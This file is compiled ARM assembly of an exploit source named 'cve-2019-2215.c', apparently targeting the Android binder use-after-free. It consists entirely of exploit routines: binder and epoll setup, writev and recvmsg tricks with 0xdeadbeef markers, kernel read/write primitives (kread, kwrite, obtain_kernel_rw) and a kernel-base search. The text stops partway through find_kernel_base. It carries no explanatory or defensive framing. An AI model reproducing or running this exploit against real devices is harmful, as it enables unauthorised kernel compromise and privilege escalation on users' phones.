	.text
	.syntax unified
	.eabi_attribute	67, "2.09"	@ Tag_conformance
	.cpu	arm7tdmi
	.eabi_attribute	6, 2	@ Tag_CPU_arch
	.eabi_attribute	8, 1	@ Tag_ARM_ISA_use
	.eabi_attribute	9, 1	@ Tag_THUMB_ISA_use
	.eabi_attribute	34, 0	@ Tag_CPU_unaligned_access
	.eabi_attribute	15, 1	@ Tag_ABI_PCS_RW_data
	.eabi_attribute	16, 1	@ Tag_ABI_PCS_RO_data
	.eabi_attribute	17, 2	@ Tag_ABI_PCS_GOT_use
	.eabi_attribute	20, 1	@ Tag_ABI_FP_denormal
	.eabi_attribute	21, 1	@ Tag_ABI_FP_exceptions
	.eabi_attribute	23, 3	@ Tag_ABI_FP_number_model
	.eabi_attribute	24, 1	@ Tag_ABI_align_needed
	.eabi_attribute	25, 1	@ Tag_ABI_align_preserved
	.eabi_attribute	38, 1	@ Tag_ABI_FP_16bit_format
	.eabi_attribute	18, 4	@ Tag_ABI_PCS_wchar_t
	.eabi_attribute	26, 2	@ Tag_ABI_enum_size
	.eabi_attribute	14, 0	@ Tag_ABI_PCS_R9_use
	.file	"cve-2019-2215.c"
	.globl	kwrite                  @ -- Begin function kwrite
	.p2align	2
	.type	kwrite,%function
	.code	32                      @ @kwrite
kwrite:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#24
	sub	sp, sp, #24
	mov	r12, r1
	mov	lr, r0
	str	r1, [r11, #-4]
	str	r0, [r11, #-8]
	str	r2, [sp, #12]
	str	r3, [sp, #8]
	str	r12, [sp, #4]           @ 4-byte Spill
	str	lr, [sp]                @ 4-byte Spill
	bl	__errno
	mov	r1, #0
	str	r1, [r0]
	ldr	r0, [sp, #8]
	cmp	r0, #4096
	bls	.LBB0_2
	b	.LBB0_1
.LBB0_1:
	ldr	r2, [sp, #8]
	ldr	r1, .LCPI0_0
.LPC0_0:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB0_2:
	ldr	r0, .LCPI0_1
.LPC0_1:
	add	r0, pc, r0
	ldr	r0, [r0, #4]
	ldr	r1, [sp, #12]
	ldr	r2, [sp, #8]
	bl	write
	ldr	r1, [sp, #8]
	cmp	r0, r1
	beq	.LBB0_4
	b	.LBB0_3
.LBB0_3:
	ldr	r1, .LCPI0_2
.LPC0_2:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB0_4:
	ldr	r0, .LCPI0_3
.LPC0_3:
	ldr	r0, [pc, r0]
	ldr	r1, [r11, #-8]
	ldr	r2, [sp, #8]
	bl	read
	ldr	r1, [sp, #8]
	cmp	r0, r1
	beq	.LBB0_6
	b	.LBB0_5
.LBB0_5:
	ldr	r1, .LCPI0_4
.LPC0_4:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB0_6:
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.7:
.LCPI0_0:
	.long	.L.str-(.LPC0_0+8)
.LCPI0_1:
	.long	kernel_rw_pipe-(.LPC0_1+8)
.LCPI0_2:
	.long	.L.str.1-(.LPC0_2+8)
.LCPI0_3:
	.long	kernel_rw_pipe-(.LPC0_3+8)
.LCPI0_4:
	.long	.L.str.2-(.LPC0_4+8)
.Lfunc_end0:
	.size	kwrite, .Lfunc_end0-kwrite
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	kread                   @ -- Begin function kread
	.p2align	2
	.type	kread,%function
	.code	32                      @ @kread
kread:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#24
	sub	sp, sp, #24
	mov	r12, r1
	mov	lr, r0
	str	r1, [r11, #-4]
	str	r0, [r11, #-8]
	str	r2, [sp, #12]
	str	r3, [sp, #8]
	str	r12, [sp, #4]           @ 4-byte Spill
	str	lr, [sp]                @ 4-byte Spill
	bl	__errno
	mov	r1, #0
	str	r1, [r0]
	ldr	r0, [sp, #8]
	cmp	r0, #4096
	bls	.LBB1_2
	b	.LBB1_1
.LBB1_1:
	ldr	r2, [sp, #8]
	ldr	r1, .LCPI1_0
.LPC1_0:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB1_2:
	ldr	r0, .LCPI1_1
.LPC1_1:
	add	r0, pc, r0
	ldr	r0, [r0, #4]
	ldr	r1, [r11, #-8]
	ldr	r2, [sp, #8]
	bl	write
	ldr	r1, [sp, #8]
	cmp	r0, r1
	beq	.LBB1_4
	b	.LBB1_3
.LBB1_3:
	ldr	r1, .LCPI1_2
.LPC1_2:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB1_4:
	ldr	r0, .LCPI1_3
.LPC1_3:
	ldr	r0, [pc, r0]
	ldr	r1, [sp, #12]
	ldr	r2, [sp, #8]
	bl	read
	ldr	r1, [sp, #8]
	cmp	r0, r1
	beq	.LBB1_6
	b	.LBB1_5
.LBB1_5:
	ldr	r1, .LCPI1_4
.LPC1_4:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB1_6:
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
	.p2align	2
@ %bb.7:
.LCPI1_0:
	.long	.L.str.3-(.LPC1_0+8)
.LCPI1_1:
	.long	kernel_rw_pipe-(.LPC1_1+8)
.LCPI1_2:
	.long	.L.str.4-(.LPC1_2+8)
.LCPI1_3:
	.long	kernel_rw_pipe-(.LPC1_3+8)
.LCPI1_4:
	.long	.L.str.5-(.LPC1_4+8)
.Lfunc_end1:
	.size	kread, .Lfunc_end1-kread
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	kread_u64               @ -- Begin function kread_u64
	.p2align	2
	.type	kread_u64,%function
	.code	32                      @ @kread_u64
kread_u64:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#24
	sub	sp, sp, #24
	mov	r2, r1
	mov	r3, r0
	str	r1, [r11, #-4]
	str	r0, [r11, #-8]
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	add	r12, sp, #8
	mov	lr, #8
	str	r2, [sp, #4]            @ 4-byte Spill
	mov	r2, r12
	str	r3, [sp]                @ 4-byte Spill
	mov	r3, lr
	bl	kread
	ldr	r0, [sp, #8]
	ldr	r1, [sp, #12]
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
.Lfunc_end2:
	.size	kread_u64, .Lfunc_end2-kread_u64
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	kread_u32               @ -- Begin function kread_u32
	.p2align	2
	.type	kread_u32,%function
	.code	32                      @ @kread_u32
kread_u32:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#24
	sub	sp, sp, #24
	mov	r2, r1
	mov	r3, r0
	str	r1, [r11, #-4]
	str	r0, [r11, #-8]
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	add	r12, sp, #12
	mov	lr, #4
	str	r2, [sp, #8]            @ 4-byte Spill
	mov	r2, r12
	str	r3, [sp, #4]            @ 4-byte Spill
	mov	r3, lr
	bl	kread
	ldr	r0, [sp, #12]
	mov	r1, #0
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
.Lfunc_end3:
	.size	kread_u32, .Lfunc_end3-kread_u32
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	kwrite_u64              @ -- Begin function kwrite_u64
	.p2align	2
	.type	kwrite_u64,%function
	.code	32                      @ @kwrite_u64
kwrite_u64:
	.fnstart
@ %bb.0:
	.save	{r4, r5, r11, lr}
	push	{r4, r5, r11, lr}
	.setfp	r11, sp, #8
	add	r11, sp, #8
	.pad	#32
	sub	sp, sp, #32
	mov	r12, r3
	mov	lr, r2
	mov	r4, r1
	mov	r5, r0
	str	r1, [r11, #-12]
	str	r0, [r11, #-16]
	str	r3, [sp, #20]
	str	r2, [sp, #16]
	ldr	r0, [r11, #-16]
	ldr	r1, [r11, #-12]
	add	r2, sp, #16
	mov	r3, #8
	str	r12, [sp, #12]          @ 4-byte Spill
	str	lr, [sp, #8]            @ 4-byte Spill
	str	r4, [sp, #4]            @ 4-byte Spill
	str	r5, [sp]                @ 4-byte Spill
	bl	kwrite
	sub	sp, r11, #8
	pop	{r4, r5, r11, lr}
	bx	lr
.Lfunc_end4:
	.size	kwrite_u64, .Lfunc_end4-kwrite_u64
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	kwrite_u32              @ -- Begin function kwrite_u32
	.p2align	2
	.type	kwrite_u32,%function
	.code	32                      @ @kwrite_u32
kwrite_u32:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#24
	sub	sp, sp, #24
	mov	r3, r1
	mov	r12, r0
	str	r1, [r11, #-4]
	str	r0, [r11, #-8]
	str	r2, [sp, #12]
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	add	r2, sp, #12
	mov	lr, #4
	str	r3, [sp, #8]            @ 4-byte Spill
	mov	r3, lr
	str	r12, [sp, #4]           @ 4-byte Spill
	bl	kwrite
	mov	sp, r11
	pop	{r11, lr}
	bx	lr
.Lfunc_end5:
	.size	kwrite_u32, .Lfunc_end5-kwrite_u32
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	prepare_globals         @ -- Begin function prepare_globals
	.p2align	2
	.type	prepare_globals,%function
	.code	32                      @ @prepare_globals
prepare_globals:
	.fnstart
@ %bb.0:
	.save	{r4, r5, r11, lr}
	push	{r4, r5, r11, lr}
	.setfp	r11, sp, #8
	add	r11, sp, #8
	.pad	#408
	sub	sp, sp, #408
	bl	getpid
	ldr	r1, .LCPI6_0
.LPC6_0:
	add	r1, pc, r1
	str	r0, [r1]
	add	r0, sp, #16
	bl	uname
	cmn	r0, #1
	bne	.LBB6_2
	b	.LBB6_1
.LBB6_1:
	ldr	r1, .LCPI6_1
.LPC6_1:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB6_2:
	add	r0, sp, #16
	add	r0, r0, #130
	ldr	r1, .LCPI6_2
.LPC6_2:
	add	r1, pc, r1
	bl	strcmp
	cmp	r0, #0
	beq	.LBB6_4
	b	.LBB6_3
.LBB6_3:
	ldr	r0, .LCPI6_3
.LPC6_3:
	add	r0, pc, r0
	bl	warnx
	b	.LBB6_4
.LBB6_4:
	mov	r0, sp
	mov	r1, #0
	str	r1, [r0, #4]
	mvn	r2, #0
	str	r2, [r0]
	mov	r0, #8192
	mov	r2, #3
	mov	r3, #34
	str	r0, [sp, #12]           @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #12]           @ 4-byte Reload
	bl	mmap
	ldr	r1, .LCPI6_4
.LPC6_4:
	add	r1, pc, r1
	str	r0, [r1]
	ldr	r0, .LCPI6_5
.LPC6_5:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB6_6
	b	.LBB6_5
.LBB6_5:
	ldr	r1, .LCPI6_6
.LPC6_6:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB6_6:
	ldr	r0, .LCPI6_7
.LPC6_7:
	add	r0, pc, r0
	bl	pipe
	cmp	r0, #0
	beq	.LBB6_8
	b	.LBB6_7
.LBB6_7:
	ldr	r1, .LCPI6_8
.LPC6_8:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB6_8:
	ldr	r0, .LCPI6_9
.LPC6_9:
	add	r0, pc, r0
	mov	r1, #0
	bl	open
	ldr	r1, .LCPI6_10
.LPC6_10:
	add	r1, pc, r1
	str	r0, [r1]
	mov	r0, #1000
	bl	epoll_create
	ldr	r1, .LCPI6_11
.LPC6_11:
	add	r1, pc, r1
	str	r0, [r1]
	sub	sp, r11, #8
	pop	{r4, r5, r11, lr}
	bx	lr
	.p2align	2
@ %bb.9:
.LCPI6_0:
	.long	pid-(.LPC6_0+8)
.LCPI6_1:
	.long	.L.str.6-(.LPC6_1+8)
.LCPI6_2:
	.long	.L.str.7-(.LPC6_2+8)
.LCPI6_3:
	.long	.L.str.8-(.LPC6_3+8)
.LCPI6_4:
	.long	dummy_page-(.LPC6_4+8)
.LCPI6_5:
	.long	dummy_page-(.LPC6_5+8)
.LCPI6_6:
	.long	.L.str.9-(.LPC6_6+8)
.LCPI6_7:
	.long	kernel_rw_pipe-(.LPC6_7+8)
.LCPI6_8:
	.long	.L.str.10-(.LPC6_8+8)
.LCPI6_9:
	.long	.L.str.11-(.LPC6_9+8)
.LCPI6_10:
	.long	binder_fd-(.LPC6_10+8)
.LCPI6_11:
	.long	epoll_fd-(.LPC6_11+8)
.Lfunc_end6:
	.size	prepare_globals, .Lfunc_end6-prepare_globals
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	find_current            @ -- Begin function find_current
	.p2align	2
	.type	find_current,%function
	.code	32                      @ @find_current
find_current:
	.fnstart
@ %bb.0:
	.save	{r4, r5, r11, lr}
	push	{r4, r5, r11, lr}
	.setfp	r11, sp, #8
	add	r11, sp, #8
	.pad	#456
	sub	sp, sp, #456
	ldr	r0, .LCPI7_2
.LPC7_0:
	ldr	r0, [pc, r0]
	str	r0, [r11, #-24]
	ldr	r0, .LCPI7_3
.LPC7_1:
	add	r0, pc, r0
	ldr	r1, [r0, #4]
	ldr	r2, [r0, #8]
	ldr	r0, [r0, #12]
	str	r0, [r11, #-12]
	str	r2, [r11, #-16]
	str	r1, [r11, #-20]
	ldr	r0, .LCPI7_4
.LPC7_2:
	ldr	r0, [pc, r0]
	ldr	r2, .LCPI7_5
.LPC7_3:
	ldr	r2, [pc, r2]
	mov	r1, #1
	sub	r3, r11, #24
	bl	epoll_ctl
	cmp	r0, #0
	beq	.LBB7_2
	b	.LBB7_1
.LBB7_1:
	ldr	r1, .LCPI7_6
.LPC7_4:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB7_2:
	add	r0, sp, #40
	mov	r1, #400
	bl	__aeabi_memclr4
	ldr	r0, .LCPI7_7
.LPC7_5:
	ldr	r0, [pc, r0]
	str	r0, [sp, #200]
	mov	r0, #4096
	str	r0, [sp, #204]
	ldr	r1, .LCPI7_0
	str	r1, [sp, #208]
	str	r0, [sp, #212]
	add	r0, sp, #32
	bl	pipe
	cmp	r0, #0
	beq	.LBB7_4
	b	.LBB7_3
.LBB7_3:
	ldr	r1, .LCPI7_8
.LPC7_6:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB7_4:
	ldr	r0, [sp, #32]
	mov	r1, #7
	orr	r1, r1, #1024
	mov	r2, #4096
	bl	fcntl
	cmp	r0, #4096
	beq	.LBB7_6
	b	.LBB7_5
.LBB7_5:
	ldr	r1, .LCPI7_9
.LPC7_7:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB7_6:
	bl	fork
	ldr	r1, .LCPI7_10
.LPC7_8:
	add	r1, pc, r1
	str	r0, [r1]
	ldr	r0, .LCPI7_11
.LPC7_9:
	ldr	r0, [pc, r0]
	cmn	r0, #1
	bne	.LBB7_8
	b	.LBB7_7
.LBB7_7:
	ldr	r1, .LCPI7_12
.LPC7_10:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB7_8:
	ldr	r0, .LCPI7_13
.LPC7_11:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	bne	.LBB7_12
	b	.LBB7_9
.LBB7_9:
	mov	r0, #1
	mov	r1, #9
	bl	prctl
	mov	r1, #2
	str	r0, [sp, #20]           @ 4-byte Spill
	mov	r0, r1
	str	r1, [sp, #16]           @ 4-byte Spill
	bl	sleep
	ldr	r1, .LCPI7_14
.LPC7_12:
	ldr	r1, [pc, r1]
	ldr	r2, .LCPI7_15
.LPC7_13:
	ldr	r2, [pc, r2]
	sub	r3, r11, #24
	str	r0, [sp, #12]           @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #16]           @ 4-byte Reload
	bl	epoll_ctl
	ldr	r1, [sp, #32]
	ldr	r2, .LCPI7_16
.LPC7_14:
	add	r2, pc, r2
	mov	r3, #4096
	str	r0, [sp, #8]            @ 4-byte Spill
	mov	r0, r1
	mov	r1, r2
	mov	r2, r3
	bl	read
	cmp	r0, #4096
	beq	.LBB7_11
	b	.LBB7_10
.LBB7_10:
	ldr	r1, .LCPI7_17
.LPC7_15:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB7_11:
	ldr	r0, [sp, #36]
	bl	close
	mov	r1, #0
	str	r0, [sp, #4]            @ 4-byte Spill
	mov	r0, r1
	bl	exit
.LBB7_12:
	ldr	r0, .LCPI7_18
.LPC7_16:
	ldr	r0, [pc, r0]
	ldr	r1, .LCPI7_1
	mov	r2, #0
	bl	ioctl
	ldr	r1, [sp, #36]
	add	r2, sp, #40
	mov	r3, #50
	str	r0, [sp]                @ 4-byte Spill
	mov	r0, r1
	mov	r1, r2
	mov	r2, r3
	bl	writev
	str	r0, [sp, #28]
	ldr	r0, [sp, #28]
	cmp	r0, #8192
	beq	.LBB7_14
	b	.LBB7_13
.LBB7_13:
	ldr	r2, [sp, #28]
	ldr	r1, .LCPI7_19
.LPC7_17:
	add	r1, pc, r1
	mov	r0, #1
	mov	r3, #8192
	bl	errx
.LBB7_14:
	ldr	r0, [sp, #32]
	ldr	r1, .LCPI7_20
.LPC7_18:
	add	r1, pc, r1
	mov	r2, #4096
	bl	read
	cmp	r0, #4096
	beq	.LBB7_16
	b	.LBB7_15
.LBB7_15:
	ldr	r1, .LCPI7_21
.LPC7_19:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB7_16:
	add	r0, sp, #24
	bl	wait
	ldr	r1, .LCPI7_22
.LPC7_20:
	ldr	r1, [pc, r1]
	cmp	r0, r1
	beq	.LBB7_18
	b	.LBB7_17
.LBB7_17:
	ldr	r1, .LCPI7_23
.LPC7_21:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB7_18:
	ldr	r0, .LCPI7_24
.LPC7_22:
	add	r0, pc, r0
	ldr	r1, [r0, #232]
	ldr	r0, [r0, #236]
	ldr	r2, .LCPI7_25
.LPC7_23:
	add	r2, pc, r2
	str	r0, [r2, #4]
	str	r1, [r2]
	sub	sp, r11, #8
	pop	{r4, r5, r11, lr}
	bx	lr
	.p2align	2
@ %bb.19:
.LCPI7_0:
	.long	3735928559              @ 0xdeadbeef
.LCPI7_1:
	.long	1074029064              @ 0x40046208
.LCPI7_2:
	.long	.L__const.find_current.event-(.LPC7_0+8)
.LCPI7_3:
	.long	.L__const.find_current.event-(.LPC7_1+8)
.LCPI7_4:
	.long	epoll_fd-(.LPC7_2+8)
.LCPI7_5:
	.long	binder_fd-(.LPC7_3+8)
.LCPI7_6:
	.long	.L.str.12-(.LPC7_4+8)
.LCPI7_7:
	.long	dummy_page-(.LPC7_5+8)
.LCPI7_8:
	.long	.L.str.13-(.LPC7_6+8)
.LCPI7_9:
	.long	.L.str.14-(.LPC7_7+8)
.LCPI7_10:
	.long	pid-(.LPC7_8+8)
.LCPI7_11:
	.long	pid-(.LPC7_9+8)
.LCPI7_12:
	.long	.L.str.15-(.LPC7_10+8)
.LCPI7_13:
	.long	pid-(.LPC7_11+8)
.LCPI7_14:
	.long	epoll_fd-(.LPC7_12+8)
.LCPI7_15:
	.long	binder_fd-(.LPC7_13+8)
.LCPI7_16:
	.long	find_current.page_buffer-(.LPC7_14+8)
.LCPI7_17:
	.long	.L.str.16-(.LPC7_15+8)
.LCPI7_18:
	.long	binder_fd-(.LPC7_16+8)
.LCPI7_19:
	.long	.L.str.17-(.LPC7_17+8)
.LCPI7_20:
	.long	find_current.page_buffer-(.LPC7_18+8)
.LCPI7_21:
	.long	.L.str.16-(.LPC7_19+8)
.LCPI7_22:
	.long	pid-(.LPC7_20+8)
.LCPI7_23:
	.long	.L.str.18-(.LPC7_21+8)
.LCPI7_24:
	.long	find_current.page_buffer-(.LPC7_22+8)
.LCPI7_25:
	.long	current-(.LPC7_23+8)
.Lfunc_end7:
	.size	find_current, .Lfunc_end7-find_current
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	obtain_kernel_rw        @ -- Begin function obtain_kernel_rw
	.p2align	2
	.type	obtain_kernel_rw,%function
	.code	32                      @ @obtain_kernel_rw
obtain_kernel_rw:
	.fnstart
@ %bb.0:
	.save	{r4, r5, r11, lr}
	push	{r4, r5, r11, lr}
	.setfp	r11, sp, #8
	add	r11, sp, #8
	.pad	#544
	sub	sp, sp, #544
	ldr	r0, .LCPI8_3
.LPC8_0:
	ldr	r0, [pc, r0]
	str	r0, [r11, #-24]
	ldr	r0, .LCPI8_4
.LPC8_1:
	add	r0, pc, r0
	ldr	r1, [r0, #4]
	ldr	r2, [r0, #8]
	ldr	r0, [r0, #12]
	str	r0, [r11, #-12]
	str	r2, [r11, #-16]
	str	r1, [r11, #-20]
	ldr	r0, .LCPI8_5
.LPC8_2:
	ldr	r0, [pc, r0]
	ldr	r2, .LCPI8_6
.LPC8_3:
	ldr	r2, [pc, r2]
	mov	r1, #1
	sub	r3, r11, #24
	bl	epoll_ctl
	cmp	r0, #0
	beq	.LBB8_2
	b	.LBB8_1
.LBB8_1:
	ldr	r1, .LCPI8_7
.LPC8_4:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB8_2:
	add	r0, sp, #128
	mov	r1, #400
	bl	__aeabi_memclr4
	ldr	r0, .LCPI8_8
.LPC8_5:
	ldr	r0, [pc, r0]
	str	r0, [sp, #288]
	mov	r0, #1
	str	r0, [sp, #292]
	ldr	r1, .LCPI8_0
	str	r1, [sp, #296]
	mov	r2, #40
	str	r2, [sp, #300]
	ldr	r3, .LCPI8_1
	str	r3, [sp, #304]
	mov	r3, #8
	str	r3, [sp, #308]
	mov	r12, #0
	str	r12, [sp, #84]
	str	r0, [sp, #80]
	str	r12, [sp, #92]
	str	r1, [sp, #88]
	str	r12, [sp, #100]
	str	r2, [sp, #96]
	ldr	r1, .LCPI8_9
.LPC8_6:
	add	r1, pc, r1
	ldr	r1, [r1, #4]
	ldr	r2, .LCPI8_10
.LPC8_7:
	ldr	r2, [pc, r2]
	adds	r2, r2, #8
	adc	r1, r1, #0
	str	r2, [sp, #104]
	str	r1, [sp, #108]
	str	r12, [sp, #116]
	str	r3, [sp, #112]
	mvn	r1, #0
	str	r1, [sp, #124]
	mvn	r1, #1
	str	r1, [sp, #120]
	add	r3, sp, #72
	str	r0, [sp, #28]           @ 4-byte Spill
	ldr	r1, [sp, #28]           @ 4-byte Reload
	mov	r2, r12
	bl	socketpair
	cmp	r0, #0
	beq	.LBB8_4
	b	.LBB8_3
.LBB8_3:
	ldr	r1, .LCPI8_11
.LPC8_8:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB8_4:
	ldr	r0, [sp, #76]
	ldr	r1, .LCPI8_12
.LPC8_9:
	add	r1, pc, r1
	mov	r2, #1
	bl	write
	cmp	r0, #1
	beq	.LBB8_6
	b	.LBB8_5
.LBB8_5:
	ldr	r1, .LCPI8_13
.LPC8_10:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB8_6:
	bl	fork
	ldr	r1, .LCPI8_14
.LPC8_11:
	add	r1, pc, r1
	str	r0, [r1]
	ldr	r0, .LCPI8_15
.LPC8_12:
	ldr	r0, [pc, r0]
	cmn	r0, #1
	bne	.LBB8_8
	b	.LBB8_7
.LBB8_7:
	ldr	r1, .LCPI8_16
.LPC8_13:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB8_8:
	ldr	r0, .LCPI8_17
.LPC8_14:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	bne	.LBB8_12
	b	.LBB8_9
.LBB8_9:
	mov	r0, #1
	mov	r1, #9
	bl	prctl
	mov	r1, #2
	str	r0, [sp, #24]           @ 4-byte Spill
	mov	r0, r1
	str	r1, [sp, #20]           @ 4-byte Spill
	bl	sleep
	ldr	r1, .LCPI8_18
.LPC8_15:
	ldr	r1, [pc, r1]
	ldr	r2, .LCPI8_19
.LPC8_16:
	ldr	r2, [pc, r2]
	sub	r3, r11, #24
	str	r0, [sp, #16]           @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #20]           @ 4-byte Reload
	bl	epoll_ctl
	mov	r1, #48
	str	r1, [sp, #68]
	ldr	r1, [sp, #76]
	ldr	r2, [sp, #68]
	add	r3, sp, #80
	str	r0, [sp, #12]           @ 4-byte Spill
	mov	r0, r1
	mov	r1, r3
	bl	write
	ldr	r1, [sp, #68]
	cmp	r0, r1
	beq	.LBB8_11
	b	.LBB8_10
.LBB8_10:
	ldr	r1, .LCPI8_20
.LPC8_17:
	add	r1, pc, r1
	mov	r0, #1
	bl	err
.LBB8_11:
	mov	r0, #0
	bl	exit
.LBB8_12:
	ldr	r0, .LCPI8_21
.LPC8_18:
	ldr	r0, [pc, r0]
	ldr	r1, .LCPI8_2
	mov	r2, #0
	str	r2, [sp, #8]            @ 4-byte Spill
	bl	ioctl
	ldr	r1, [sp, #8]            @ 4-byte Reload
	str	r1, [sp, #40]
	str	r1, [sp, #44]
	add	r2, sp, #128
	str	r2, [sp, #48]
	mov	r2, #50
	str	r2, [sp, #52]
	str	r1, [sp, #56]
	str	r1, [sp, #60]
	str	r1, [sp, #64]
	ldr	r2, [sp, #292]
	ldr	r3, [sp, #300]
	ldr	r12, [sp, #308]
	add	r2, r2, r3
	add	r2, r2, r12
	str	r2, [sp, #36]
	ldr	r2, [sp, #72]
	add	r1, sp, #40
	mov	r3, #256
	str	r0, [sp, #4]            @ 4-byte Spill
	mov	r0, r2
	mov	r2, r3
	bl	recvmsg
	str	r0, [sp, #32]
	ldr	r0, [sp, #32]
	ldr	r1, [sp, #36]
	cmp	r0, r1
	beq	.LBB8_14
	b	.LBB8_13
.LBB8_13:
	ldr	r2, [sp, #32]
	ldr	r3, [sp, #36]
	ldr	r1, .LCPI8_22
.LPC8_19:
	add	r1, pc, r1
	mov	r0, #1
	bl	errx
.LBB8_14:
	ldr	r0, .LCPI8_23
.LPC8_20:
	ldr	r0, [pc, r0]
	ldr	r0, [r0]
	mov	r1, #0
	bl	setbuf
	sub	sp, r11, #8
	pop	{r4, r5, r11, lr}
	bx	lr
	.p2align	2
@ %bb.15:
.LCPI8_0:
	.long	3735928559              @ 0xdeadbeef
.LCPI8_1:
	.long	3203391149              @ 0xbeefdead
.LCPI8_2:
	.long	1074029064              @ 0x40046208
.LCPI8_3:
	.long	.L__const.obtain_kernel_rw.event-(.LPC8_0+8)
.LCPI8_4:
	.long	.L__const.obtain_kernel_rw.event-(.LPC8_1+8)
.LCPI8_5:
	.long	epoll_fd-(.LPC8_2+8)
.LCPI8_6:
	.long	binder_fd-(.LPC8_3+8)
.LCPI8_7:
	.long	.L.str.12-(.LPC8_4+8)
.LCPI8_8:
	.long	dummy_page-(.LPC8_5+8)
.LCPI8_9:
	.long	current-(.LPC8_6+8)
.LCPI8_10:
	.long	current-(.LPC8_7+8)
.LCPI8_11:
	.long	.L.str.19-(.LPC8_8+8)
.LCPI8_12:
	.long	.L.str.20-(.LPC8_9+8)
.LCPI8_13:
	.long	.L.str.21-(.LPC8_10+8)
.LCPI8_14:
	.long	pid-(.LPC8_11+8)
.LCPI8_15:
	.long	pid-(.LPC8_12+8)
.LCPI8_16:
	.long	.L.str.15-(.LPC8_13+8)
.LCPI8_17:
	.long	pid-(.LPC8_14+8)
.LCPI8_18:
	.long	epoll_fd-(.LPC8_15+8)
.LCPI8_19:
	.long	binder_fd-(.LPC8_16+8)
.LCPI8_20:
	.long	.L.str.22-(.LPC8_17+8)
.LCPI8_21:
	.long	binder_fd-(.LPC8_18+8)
.LCPI8_22:
	.long	.L.str.23-(.LPC8_19+8)
.LCPI8_23:
.Ltmp0:
	.long	stdout(GOT_PREL)-((.LPC8_20+8)-.Ltmp0)
.Lfunc_end8:
	.size	obtain_kernel_rw, .Lfunc_end8-obtain_kernel_rw
	.cantunwind
	.fnend
                                        @ -- End function
	.globl	find_kernel_base        @ -- Begin function find_kernel_base
	.p2align	2
	.type	find_kernel_base,%function
	.code	32                      @ @find_kernel_base
find_kernel_base:
	.fnstart
@ %bb.0:
	.save	{r11, lr}
	push	{r11, lr}
	.setfp	r11, sp
	mov	r11, sp
	.pad	#232
	sub	sp, sp, #232
	ldr	r0, .LCPI9_2
.LPC9_0:
	add	r0, pc, r0
	ldr	r0, [r0, #4]
	ldr	r1, .LCPI9_3
.LPC9_1:
	ldr	r1, [pc, r1]
	adds	r1, r1, #1312
	adc	r0, r0, #0
	str	r0, [sp, #4]            @ 4-byte Spill
	mov	r0, r1
	ldr	r1, [sp, #4]            @ 4-byte Reload
	bl	kread_u64
	str	r1, [r11, #-4]
	str	r0, [r11, #-8]
	ldr	r0, [r11, #-8]
	ldr	r1, [r11, #-4]
	adds	r0, r0, #768
	adc	r1, r1, #0
	bl	kread_u64
	str	r1, [r11, #-12]
	str	r0, [r11, #-16]
	ldr	r0, [r11, #-16]
	ldr	r1, [r11, #-12]
	ldr	r2, .LCPI9_0
	adds	r0, r0, r2
	sbc	r1, r1, #0
	ldr	r2, .LCPI9_4
.LPC9_2:
	add	r2, pc, r2
	str	r0, [r2]
	str	r1, [r2, #4]
	ldrh	r0, [r2]
	mov	r1, #255
	orr	r1, r1, #3840
	tst	r0, r1
	beq	.LBB9_4
	b	.LBB9_1
.LBB9_1:
	ldr	r0, .LCPI9_5
.LPC9_3:
	ldr	r0, [pc, r0]
	cmp	r0, #0
	beq	.LBB9_3
	b	.LBB9_2
.LBB9_2:
	ldr	r0, .LCPI9_6
.LPC9_4:
	add	r0, pc, r0
	bl	warnx
	ldr	r0, .LCPI9_7
.LPC9_5:
	add	r0, pc, r0
	mov	r1, #0
